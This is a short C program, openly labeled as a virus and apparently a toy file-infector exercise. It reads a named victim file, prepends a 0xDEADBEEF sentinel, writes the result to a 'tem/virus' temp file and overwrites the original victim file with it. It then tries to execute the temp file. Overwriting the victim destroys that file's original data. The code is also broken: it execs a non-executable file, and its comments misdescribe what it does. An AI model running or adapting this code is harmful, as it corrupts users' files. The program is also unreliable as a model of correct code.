#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/types.h>

const char SENTINEL[] = "\xde\xad\xbe\xef";

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: ./virus <victim_file>\n");
        return 0;
    }

    const char *victim = argv[1];

    // Step 1: Read victim file using file descriptor (int)
    int fd = open(victim, O_RDONLY);

    if (fd < 0) {
        perror("Opening victim");
        return 1;
    }

    // Get file size
    struct stat st;
    fstat(fd, &st);

    size_t filesize = st.st_size;

    // Read entire file into buffer
    char *buf = malloc(filesize + 256);

    if (!buf) {
        perror("Allocating buffer");
        close(fd);
        return 1;
    }

    size_t readsize = read(fd, buf, filesize);
    close(fd);

    // Step 2: Prepend the virus seed (sentinel + host bytes)
    // Insert sentinel before the host data
    memmove(buf + 4, buf, filesize); // Slide content down by 4 bytes

    buf[0] = '\xde';
    buf[1] = '\xad';
    buf[2] = '\xbe';
    buf[3] = '\xef';

    // Step 3: Write infected version to temp file
    char tempname[] = "tem/virus";
    mkdir("tem", 0755);

    int fdtemp = open(tempname, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    if (fdtemp < 0) {
        perror("Creating temp");
        free(buf);
        return 1;
    }

    write(fdtemp, buf, readsize + 4);
    close(fdtemp);

    // Step 4: Replace victim with the infected version
    int fdvictim = open(victim, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    if (fdvictim >= 0) {
        write(fdvictim, buf, readsize + 4);
        close(fdvictim);
    }

    // Step 5: Run the host from the temp folder
    printf("Infected %s. Running host portion...\n", victim);

    // Execute from temp folder (host runs as ./tem/virus <victim>)
    char *arg[] = {"tem/virus", argv[1], NULL};
    execv(tempname, arg);

    printf("Host ran. Exit code: %d\n", 0);

    free(buf);
    return 0;
}